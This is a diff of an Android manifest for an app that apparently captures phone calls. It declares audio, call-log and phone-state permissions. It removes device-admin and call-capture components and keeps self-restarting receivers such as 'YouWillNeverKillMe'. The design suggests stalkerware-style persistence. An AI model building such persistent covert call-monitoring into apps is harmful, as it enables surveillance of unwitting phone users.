@@ -7,7 +7,6 @@
     <uses-permission android:name="android.permission.RECEIVE_MMS" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    <!--<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />-->
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.STORAGE" />
@@ -41,41 +40,12 @@
             </intent-filter>
         </activity>
 
-        <receiver
-            android:name=".postal.catchPhone.Call.DeviceAdminDemo"
-            android:description="@string/device_description"
-            android:label="@string/device_admin_label"
-            android:permission="android.permission.BIND_DEVICE_ADMIN">
-            <meta-data
-                android:name="android.app.device_admin"
-                android:resource="@xml/my_admin" />
-
-            <intent-filter>
-                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
-                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
-                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED" />
-            </intent-filter>
-        </receiver>
-
-        <service android:name=".postal.catchPhone.Call.TService" />
-        <service
-            android:name=".postal.service.MyService"
-            android:enabled="true"
-            android:exported="true" />
-
         <receiver android:name=".postal.service.RestartServiceReceiver">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
-                <!--<action android:name="android.intent.action.QUICKBOOT_POWERON" />
-                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />-->
                 <action android:name="YouWillNeverKillMe" />
             </intent-filter>
         </receiver>
-
-        <service
-            android:name=".postal.service.StartService"
-            android:enabled="true"
-            android:exported="true" />
 
         <receiver
             android:name=".postal.service.AlarmReceiver"
@@ -95,14 +65,6 @@
                 <action android:name="notGiveUpConnectCheckReceiver" />
             </intent-filter>
         </receiver>
-
-        <activity android:name=".postal.deleteApp.DeleteAPPActivity" />
-
-        <service
-            android:name=".postal.catchPhone.Call.PhoneCallService"
-            android:enabled="true"
-            android:exported="true" />
-
         <receiver
             android:name=".postal.catchPhone.Call.StartPhoneCallReceiver"
             android:enabled="true"
